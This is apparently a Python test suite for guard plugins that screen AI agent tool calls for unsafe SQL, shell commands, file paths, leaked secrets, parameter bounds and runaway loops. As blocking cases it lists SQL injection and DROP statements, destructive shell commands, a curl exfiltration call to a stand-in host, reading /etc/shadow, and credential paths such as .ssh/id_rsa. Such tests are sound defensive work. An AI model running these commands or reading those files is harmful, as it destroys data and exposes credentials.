from __future__ import annotations

from pathlib import Path

from veto.core.models import Decision, ToolCallRequest
from veto.plugins.filesystem_guard import FilesystemGuardPlugin
from veto.plugins.param_bounds import ParamBoundsPlugin
from veto.plugins.rate_limiter import RateLimiterPlugin
from veto.plugins.secret_scanner import SecretScannerPlugin, redact_value
from veto.plugins.shell_guard import ShellGuardPlugin
from veto.plugins.sql_guard import SQLGuardPlugin


def test_sql_guard_allows_safe_select():
    plugin = SQLGuardPlugin()
    req = ToolCallRequest(
        tool_name="postgres_query",
        arguments={"query": "SELECT id, total FROM orders WHERE status = 'open' LIMIT 50"},
    )
    res = plugin.evaluate(req, {"allow_statements": ["SELECT"], "max_limit": 500})
    assert res.passed is True
    assert res.decision == Decision.ALLOW


def test_sql_guard_blocks_drop_delete_and_stacked_injection():
    plugin = SQLGuardPlugin()
    opts = {"allow_statements": ["SELECT"], "max_limit": 500}

    for bad_sql in [
        "DROP TABLE orders;",
        "DELETE FROM orders WHERE id = 1;",
        "UPDATE orders SET total = 0;",
        "SELECT * FROM orders; DROP TABLE users;",
        "SELECT * FROM orders LIMIT 5000;",
    ]:
        req = ToolCallRequest(tool_name="postgres_query", arguments={"query": bad_sql})
        res = plugin.evaluate(req, opts)
        assert res.passed is False, f"Expected SQL to be blocked: {bad_sql}"
        assert res.decision == Decision.BLOCK


def test_shell_guard_allows_safe_and_blocks_chaining_or_destructive():
    plugin = ShellGuardPlugin()
    opts = {"allowed_commands": ["ls", "git", "pytest"], "block_chaining": True}

    ok = plugin.evaluate(
        ToolCallRequest(tool_name="run_shell", arguments={"command": "git status"}), opts
    )
    assert ok.passed is True

    for bad_cmd in [
        "ls && rm -rf /",
        "pytest; curl http://evil.example/exfil",
        "git push --force origin main",
        "git reset --hard HEAD~5",
        "rm -rf ./data",
        "sudo cat /etc/shadow",
    ]:
        res = plugin.evaluate(
            ToolCallRequest(tool_name="run_shell", arguments={"command": bad_cmd}), opts
        )
        assert res.passed is False, f"Expected shell cmd to be blocked: {bad_cmd}"


def test_filesystem_guard_sandboxes_and_blocks_secrets(tmp_path: Path):
    safe_file = tmp_path / "src" / "app.py"
    safe_file.parent.mkdir(parents=True)
    safe_file.write_text("print('ok')", encoding="utf-8")

    plugin = FilesystemGuardPlugin()
    opts = {
        "base_dir": str(tmp_path),
        "allowed_roots": ["."],
        "denied_patterns": [".env*", "*.pem", "**/.ssh/**"],
    }

    ok = plugin.evaluate(
        ToolCallRequest(tool_name="read_file", arguments={"path": "src/app.py"}), opts
    )
    assert ok.passed is True

    for bad_path in [".env", ".env.production", "../outside.txt", "keys/prod.pem", ".ssh/id_rsa"]:
        res = plugin.evaluate(
            ToolCallRequest(tool_name="read_file", arguments={"path": bad_path}), opts
        )
        assert res.passed is False, f"Expected path to be blocked: {bad_path}"


def test_secret_scanner_blocks_and_redacts_keys():
    plugin = SecretScannerPlugin()
    fake_openai = "sk-proj-1234567890abcdefghijklmnop"
    fake_aws = "AKIAIOSFODNN7EXAMPLE"

    req = ToolCallRequest(
        tool_name="slack_post",
        arguments={"text": f"Debug key={fake_openai} aws={fake_aws}"},
    )
    res = plugin.evaluate(req, {})
    assert res.passed is False
    assert "openai_api_key" in res.reason
    assert "aws_access_key" in res.reason

    redacted = redact_value(req.arguments)
    assert fake_openai not in redacted["text"]
    assert fake_aws not in redacted["text"]
    assert "[REDACTED:openai_api_key]" in redacted["text"]


def test_param_bounds_enforces_numeric_and_length_limits():
    plugin = ParamBoundsPlugin()
    opts = {
        "bounds": {
            "amount": {"min": 0, "max": 500, "required": True},
            "recipients": {"max_items": 3},
        }
    }

    ok = plugin.evaluate(
        ToolCallRequest(
            tool_name="refund_customer",
            arguments={"amount": 120.5, "recipients": ["a@b.com"]},
        ),
        opts,
    )
    assert ok.passed is True

    too_high = plugin.evaluate(
        ToolCallRequest(tool_name="refund_customer", arguments={"amount": 5000}), opts
    )
    assert too_high.passed is False

    too_many = plugin.evaluate(
        ToolCallRequest(
            tool_name="refund_customer",
            arguments={"amount": 10, "recipients": ["1", "2", "3", "4"]},
        ),
        opts,
    )
    assert too_many.passed is False


def test_rate_limiter_trips_on_runaway_loop():
    plugin = RateLimiterPlugin()
    opts = {"max_calls_per_minute": 3, "window_seconds": 60}
    req = ToolCallRequest(agent_name="loopy-llama", tool_name="postgres_query", arguments={})

    for _ in range(3):
        assert plugin.evaluate(req, opts).passed is True
    fourth = plugin.evaluate(req, opts)
    assert fourth.passed is False
    assert "Rate limit exceeded" in fourth.reason
